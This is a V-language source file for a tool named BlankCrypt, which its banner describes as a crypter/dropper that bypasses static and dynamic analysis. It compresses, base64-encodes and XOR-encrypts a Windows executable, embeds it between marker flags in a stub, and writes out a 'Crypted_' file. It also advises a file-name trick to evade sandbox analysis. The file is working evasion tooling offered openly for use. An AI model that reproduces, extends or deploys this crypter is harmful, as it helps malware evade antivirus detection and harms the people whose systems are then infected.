module main

import os
import term
import encoding.base64
import compress.zlib

import stubdata

const secretkey = "Qmxhbms="
const beginflag = "Z2l0aHViLmNvbS9CbGFuay1j"
const endflag = "QkxhTmtJc1RoRWJFc1Q="

fn xorcrypt(data []u8) []u8 {
	key := base64.decode_str(secretkey)
	mut newdata := []u8{}
	for i, val in data{
		newdata << val ^ u8(key[i % key.len])
	}
	return newdata
}

fn main() {
	println(term.colorize(term.cyan,
		"
▀█████████▄   ▄█          ▄████████ ███▄▄▄▄      ▄█   ▄█▄    ▄████████ ▄██   ▄      ▄███████▄     ███     
  ███    ███ ███         ███    ███ ███▀▀▀██▄   ███ ▄███▀   ███    ███ ███   ██▄   ███    ███ ▀█████████▄ 
  ███    ███ ███         ███    ███ ███   ███   ███▐██▀     ███    ███ ███▄▄▄███   ███    ███    ▀███▀▀██ 
 ▄███▄▄▄██▀  ███         ███    ███ ███   ███  ▄█████▀     ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███   ███    ███     ███   ▀ 
▀▀███▀▀▀██▄  ███       ▀███████████ ███   ███ ▀▀█████▄    ▀▀███▀▀▀▀▀   ▄██   ███ ▀█████████▀      ███     
  ███    ██▄ ███         ███    ███ ███   ███   ███▐██▄   ▀███████████ ███   ███   ███            ███     
  ███    ███ ███▌    ▄   ███    ███ ███   ███   ███ ▀███▄   ███    ███ ███   ███   ███            ███     
▄█████████▀  █████▄▄██   ███    █▀   ▀█   █▀    ███   ▀█▀   ███    ███  ▀█████▀   ▄████▀         ▄████▀   
             ▀                                  ▀           ███    ███                                    
"
	))
	println(term.colorize(term.bright_green, "A crypter/dropper to bypass static and dynamic analysis of your program."))
	println(term.colorize(term.bright_green, "Made by ") + term.colorize(term.cyan, "github.com/Blank-c"))
	println(term.colorize(term.bright_green, "Protection: ") + term.colorize(term.cyan, "3 layers\n"))
	
	if os.args.len != 2{
		println(term.colorize(term.yellow, "[USAGE]"))
		println(term.colorize(term.blue, "\t\"${os.base(os.executable())}\" program.exe"))
		exit(1)
	}
	if !(os.base(os.args[1]).ends_with(".exe")) {
		println(term.colorize(term.red, "[ERR]"))
		println(term.colorize(term.blue, "\t\"${os.base(os.args[1])}\" does not have .exe extention"))
		exit(1)
	} else if !(os.is_file(os.args[1])) {
		println(term.colorize(term.red, "[ERR]"))
		println(term.colorize(term.blue, "\t\"${os.base(os.args[1])}\" does not exist"))
		exit(1)
	}
	filedata := os.read_file(os.args[1]) or {
		println(term.colorize(term.red, "[ERR]"))
		println(term.colorize(term.blue, "\tUnable to read file"))
		exit(1)
	}
	if filedata.len < 97 {
		println(term.colorize(term.red, "[ERR]"))
		println(term.colorize(term.blue, "\t\"${os.base(os.args[1])}\" is not a valid executable file"))
		exit(1)
	} else if !(filedata.starts_with("MZ")) {
		println(term.colorize(term.red, "[ERR]"))
		println(term.colorize(term.blue, "\t\"${os.base(os.args[1])}\" is not a valid executable file"))
		exit(1)
	}

	mut data := filedata.bytes()
	mut finaldata := stubdata.getdata()

	data = zlib.compress(data) or {
		println(term.colorize(term.red, "[ERR]"))
		println(term.colorize(term.blue, "\tAn error occured"))
		exit(1)
	}
	data = base64.encode(data).bytes()
	data = xorcrypt(data)
	
	finaldata << base64.decode(beginflag)
	finaldata << data
	finaldata << base64.decode(endflag)

	mut filename := "Crypted_${os.args[1]}"
	mut file := os.create(filename) or {
		println(term.colorize(term.red, "[ERR]"))
		println(term.colorize(term.blue, "\tUnable to create file"))
		exit(1)
	}
	defer {
		file.close()
	}
	file.write(finaldata) or {
		println(term.colorize(term.red, "[ERR]"))
		println(term.colorize(term.blue, "\tUnable to write data"))
		exit(1)
	}

	println(term.colorize(term.green, "[Success]"))
	println(term.colorize(term.blue, "\tSuccessfully saved as \"$filename\""))
	println(term.colorize(term.blue, "\tPut \"") + term.colorize(term.yellow, "vt_") + term.colorize(term.blue, "\" before your file's name to avoid running it. This can help to bypass dynamic analysis."))
	exit(0)
}